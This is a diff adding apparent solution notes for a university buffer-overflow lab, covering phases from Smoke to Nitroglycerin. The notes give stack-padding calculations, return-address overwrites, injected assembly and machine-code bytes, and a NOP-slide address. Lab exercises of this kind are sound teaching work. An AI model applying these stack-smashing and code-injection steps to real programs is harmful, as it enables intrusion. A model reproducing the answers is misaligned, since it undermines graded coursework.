@@ -1,0 +1,42 @@
+Phase 0: Smoke
+* Calculate amount of padding by finding address of return address (x/2wx $ebp at b getbuf).  
+* Then continue to *getbuf+31, and view 100 values of the $esp.  
+* Address pointing to return address - address of where input string is held is the amount of padding.
+* Next four bytes after padding is address of smoke in little endian.
+
+Phase 1: Sparkler
+* Same as phase 0, fizz requires a function argument which are always stored at $ebp+0x8.
+
+Phase 2: Firecracker
+* Jump to address of start of code injection
+* Move cookie into address of global_variable
+* Push address of bang onto the stack
+* Return
+
+Phase 3: Dynamite
+* 28 3d 68 55		Jump to address of start of code injection
+* b8 1b 05 b2 1e	Move cookie into eax
+* bd a0 3d 68 55	Push 0x55683da0 into ebp.  test checks value of ebp at *test+27 to see if stack was overwritten.  Therefore, push value of ebp when not injecting code, so the ebp is restored to correct value.
+* 68 2c 8e 04 08	Push value of original return address
+* c3 			Return
+
+Phase 4: C4
+* Jump to address of start of code injection
+* sub $0x70, %esp	Subtract 70 from esp to ensure code injection does not overwrite it
+* pushl $0x0804c0c0 	Push address of the unique file name (function parameter of test based on 0x8(%esp)
+* pushl $0x55683d3b	Call first line
+* pushl $0x08048de3	Call createFile
+* ret
+* movl $0x1eb2051b, %eax	Move cookie into eax
+* movl $0x55683da0, %ebp	Restore ebp with original value
+* movl $0x55683d28, %esp	
+* pushl $0x08048e2c	Push address of test
+* ret
+
+Phase 5: Nitroglycerin
+* lea 0x24(%esp), %ebp	Restore ebp
+* movl $0x1eb2051b, %eax	Move cookie into eax
+* pushl $0x08048f1f		Address in testn after calling getbufn
+* ret
+* 58 3c 68 55		Middle address in nop slide
+
